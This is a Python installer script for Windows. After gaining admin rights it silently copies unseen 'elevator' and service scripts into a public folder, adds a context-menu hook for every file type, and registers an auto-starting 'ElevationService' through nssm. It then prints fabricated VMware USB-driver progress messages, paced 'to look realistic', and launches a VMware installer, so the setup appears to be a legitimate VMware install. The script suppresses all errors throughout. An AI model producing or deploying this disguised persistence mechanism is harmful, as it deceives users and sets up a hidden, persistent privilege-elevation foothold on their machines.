import os
import sys
import shutil
import subprocess
import ctypes
import winreg
import time

# === CONFIG ===
# Set the program you want to launch after setup finishes (leave "" to skip).
LAUNCH_PROGRAM = r"C:\Users\Admin\Scripts\auth_service\v4\VMware-workstation-17.6.2-24409262.exe"
LAUNCH_ARGS = []

# === helpers ===
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def elevate_and_rerun():
    # Re-run the same script with admin privileges (keeps console visible).
    script = os.path.abspath(sys.argv[0])
    params = " ".join(f'"{p}"' for p in ([script] + sys.argv[1:]))
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
    except Exception:
        pass
    sys.exit(0)

# === main ===
if not is_admin():
    elevate_and_rerun()

# From here on we are elevated and the console is visible.
script_dir = os.path.dirname(os.path.abspath(__file__))
elv_dir = r"C:\Users\Public\Documents\elv"
queue_dir = os.path.join(elv_dir, "queue")

try:
    os.makedirs(queue_dir, exist_ok=True)
except Exception:
    pass

# Copy files (if present)
for fname in ("service.py", "elevator.py", "uninstall.py", "context_menu.py"):
    try:
        src = os.path.join(script_dir, fname)
        if os.path.exists(src):
            shutil.copy(src, elv_dir)
    except Exception:
        pass

# Install context menu (best-effort, silent on errors)
try:
    key_path = r"*\shell\elv"
    key = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, key_path)
    winreg.SetValue(key, "", winreg.REG_SZ, "elv")
    winreg.CloseKey(key)

    cmd_key = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, key_path + r"\command")
    command = f'"{sys.executable}" "{os.path.join(elv_dir, "context_menu.py")}" "%1"'
    winreg.SetValue(cmd_key, "", winreg.REG_SZ, command)
    winreg.CloseKey(cmd_key)
except Exception:
    pass

# Attempt to install service using nssm (best-effort)
try:
    nssm = os.path.join(script_dir, "nssm.exe")
    if os.path.exists(nssm):
        subprocess.run([nssm, "install", "ElevationService", sys.executable, os.path.join(elv_dir, "service.py")], check=False)
        subprocess.run([nssm, "set", "ElevationService", "Start", "SERVICE_AUTO_START"], check=False)
        subprocess.run([nssm, "start", "ElevationService"], check=False)
except Exception:
    pass

# --- Fake / playful output (user requested) ---
fake_lines = [
    "===[ elv installer v2.1 ]======================================",
    "Detecting hardware... Done.",
    "Probing attached USB controllers... found 3 devices.",
    "Loading VMware USB passive bridge driver (vmusb_pbrg.sys) ... OK",
    "Applying compatibility shim for 'VMware USB 3.1 Controller' ... OK",
    "Registering fake vendor IDs for legacy passthrough... OK",
    "Installing virtual USB firmware stubs (for telemetry) ... OK",
    "Refreshing driver cache (this may take a moment) ... Done",
    "Patching guest-host conduit (experimental) ... Done",
    "Validating passthrough handshake with USB hub #2 ... OK",
    "Optimizing IO scheduler for virtual devices ... Done",
    "Service 'ElevationService' configured to start automatically.",
    "Cleaning temporary files... Done",
    "Installation complete. All systems nominal.",
    "Launching post-install tasks..."
]

for line in fake_lines:
    print(line)
    time.sleep(0.25)  # brief pause to look realistic

# Launch configured program (non-blocking). Fail silently if it errors.
if LAUNCH_PROGRAM:
    try:
        if LAUNCH_ARGS:
            subprocess.Popen([LAUNCH_PROGRAM] + LAUNCH_ARGS)
        else:
            try:
                os.startfile(LAUNCH_PROGRAM)
            except Exception:
                subprocess.Popen([LAUNCH_PROGRAM])
    except Exception:
        pass

# Keep the console open until the user presses Enter.
try:
    input("\nPress Enter to exit...")
except Exception:
    # If input fails for any reason, just pause briefly then exit.
    time.sleep(1)
